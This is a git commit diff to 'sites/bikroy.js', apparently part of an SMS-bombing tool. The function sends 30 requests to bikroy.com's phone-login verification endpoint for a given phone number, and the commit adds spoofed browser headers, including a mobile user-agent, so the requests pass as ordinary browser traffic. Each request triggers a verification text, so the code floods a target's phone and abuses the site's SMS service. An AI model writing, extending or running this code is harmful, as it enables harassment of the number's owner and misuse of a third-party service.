37dadafb511413636ccd7eb120ee3fdf8d6a0f5a
HA SA N <146573168+toxiciter69@users.noreply.github.com>
2026-02-25 21:07:00 +0600

    Update axios call for phone login verification
    Refactor API call to use axios with parameters and headers.

--- sites/bikroy.js
+++ sites/bikroy.js
@@ -6,7 +6,17 @@ async function bikroy(number, limit) {
 
     for (let i = 0; i < 30; i++) {
       try {
-      const response = await axios.get(`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${number}`);
+      const response = await axios.get('https://bikroy.com/data/phone_number_login/verifications/phone_login', {
+        params: {
+          'phone': `${number}`
+        },
+        headers: {
+          'authority': 'bikroy.com',   
+          'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',    
+          'accept-language': 'en-US,en;q=0.9',
+          'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
+        }
+      });
         console.log(`[${i + 1}/10] Bikroy Sent to ${number} | Response:`, response.data);
       } catch (error) {
         console.error(`[${i + 1}/10] Bikroy Failed:`, error.message);
